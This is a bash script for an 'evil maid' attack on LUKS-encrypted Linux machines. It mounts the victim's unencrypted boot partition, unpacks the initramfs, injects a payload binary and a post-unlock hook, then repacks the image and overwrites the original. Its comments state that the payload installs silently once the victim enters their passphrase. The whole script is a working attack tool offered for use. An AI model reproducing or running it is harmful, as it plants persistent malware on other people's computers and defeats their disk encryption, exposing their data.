#!/bin/bash
# poison_boot.sh
# Single-access LUKS attack: injects em_shell into the victim's initramfs.
# The payload installs itself silently after the victim enters their passphrase on next boot.
# Only /boot (always unencrypted) needs to be accessible — no passphrase required.
#
# Run from any Linux live USB (Ubuntu, Kali, Parrot, etc.)
# Requirements: unmkinitramfs (apt install initramfs-tools), cpio, gzip

usage() {
    echo "Usage: $0 -b <boot_partition> [-k <kernel_version>]"
    echo ""
    echo "  -b <partition>  Unencrypted /boot or EFI partition (e.g. /dev/sda1)"
    echo "  -k <version>    Kernel version to target (default: latest found)"
    echo "  -h              Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 -b /dev/sda1"
    echo "  $0 -b /dev/sda1 -k 5.15.0-91-generic"
    echo ""
    echo "Tip: run 'lsblk -f' to find the unencrypted boot partition."
    exit 1
}

BOOT_PARTITION=""
KERNEL_VER=""
BOOT_MOUNT="/mnt/victim_boot"
WORK_DIR="/tmp/em_initrd_work"
NEW_INITRD="/tmp/em_initrd_new.img"

while getopts ":b:k:h" opt; do
    case $opt in
        b) BOOT_PARTITION="$OPTARG" ;;
        k) KERNEL_VER="$OPTARG" ;;
        h) usage ;;
        :) echo "[!] Option -$OPTARG requires an argument."; usage ;;
        \?) echo "[!] Unknown option -$OPTARG"; usage ;;
    esac
done

[ -z "$BOOT_PARTITION" ] && { echo "[!] Boot partition required (-b)."; usage; }
[ ! -f ./em_shell ]       && { echo "[!] em_shell binary not found in current directory."; exit 1; }
[ ! -f ./em_inject_hook ] && { echo "[!] em_inject_hook not found in current directory."; exit 1; }

command -v unmkinitramfs &>/dev/null || {
    echo "[!] unmkinitramfs not found. Run: apt install initramfs-tools"
    exit 1
}

echo "--- Evil Maid: Boot Poison Phase ---"
echo "[*] Boot partition : $BOOT_PARTITION"

# ── Mount /boot ───────────────────────────────────────────────────────────────

mkdir -p "$BOOT_MOUNT"
mount "$BOOT_PARTITION" "$BOOT_MOUNT" || { echo "[!] Failed to mount $BOOT_PARTITION."; exit 1; }
echo "[+] Boot partition mounted at $BOOT_MOUNT."

# ── Locate initrd ─────────────────────────────────────────────────────────────

if [ -z "$KERNEL_VER" ]; then
    KERNEL_VER=$(ls "$BOOT_MOUNT"/vmlinuz-* 2>/dev/null | sort -V | tail -1 | sed 's|.*/vmlinuz-||')
    [ -z "$KERNEL_VER" ] && { echo "[!] No kernel found on $BOOT_PARTITION. Wrong partition?"; umount "$BOOT_MOUNT"; exit 1; }
fi

INITRD="$BOOT_MOUNT/initrd.img-$KERNEL_VER"
[ ! -f "$INITRD" ] && { echo "[!] initrd not found: $INITRD"; umount "$BOOT_MOUNT"; exit 1; }
echo "[+] Target initrd : initrd.img-$KERNEL_VER"

# ── Extract initramfs ─────────────────────────────────────────────────────────

rm -rf "$WORK_DIR" && mkdir -p "$WORK_DIR"
unmkinitramfs "$INITRD" "$WORK_DIR" 2>/dev/null
echo "[+] initramfs extracted."

# unmkinitramfs extracts each section to a numbered subdir (0/, 1/, ...)
# On VMs there is usually just one section (no microcode prefix).
# We identify the main section as the one containing /scripts.
MAIN_DIR=""
for dir in "$WORK_DIR"/*/; do
    [ -d "${dir}scripts" ] && { MAIN_DIR="${dir%/}"; break; }
done

# Fallback: single-section extracted directly to WORK_DIR (older unmkinitramfs)
[ -z "$MAIN_DIR" ] && [ -d "$WORK_DIR/scripts" ] && MAIN_DIR="$WORK_DIR"

[ -z "$MAIN_DIR" ] && {
    echo "[!] Could not identify main initramfs section."
    echo "    Extracted dirs:"
    ls -la "$WORK_DIR/"
    umount "$BOOT_MOUNT"
    exit 1
}
echo "[+] Main initramfs section : $MAIN_DIR"

# ── Inject payload ────────────────────────────────────────────────────────────

cp ./em_shell "$MAIN_DIR/bin/em_shell"
chmod +x "$MAIN_DIR/bin/em_shell"

# local-bottom scripts run after LUKS is unlocked and root is mounted at ${rootmnt}
cp ./em_inject_hook "$MAIN_DIR/scripts/local-bottom/em_inject"
chmod +x "$MAIN_DIR/scripts/local-bottom/em_inject"

echo "[+] em_shell binary and hook injected into initramfs."

# ── Repack initramfs ──────────────────────────────────────────────────────────
# Multi-section: early sections (microcode) are uncompressed cpio.
# Main section uses gzip — universally supported by all kernels.

> "$NEW_INITRD"

if [ "$MAIN_DIR" = "$WORK_DIR" ]; then
    # Single-section initramfs (typical in VMs)
    (cd "$WORK_DIR" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
else
    # Multi-section: iterate in sorted order, preserving section types
    for dir in $(ls -d "$WORK_DIR"/*/ 2>/dev/null | sort -V); do
        dir="${dir%/}"
        if [ "$dir" = "$MAIN_DIR" ]; then
            # Main section: gzip compressed
            (cd "$dir" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
        else
            # Early/microcode section: uncompressed cpio (kernel requirement)
            (cd "$dir" && find . | cpio -H newc -o 2>/dev/null) >> "$NEW_INITRD"
        fi
    done
fi

# ── Replace initrd and clean up ───────────────────────────────────────────────

cp "$NEW_INITRD" "$INITRD"
rm -rf "$WORK_DIR" "$NEW_INITRD"
umount "$BOOT_MOUNT"

echo "[+] initramfs repacked and replaced."
echo "[+] Done. Payload installs silently when victim next boots and enters their passphrase."
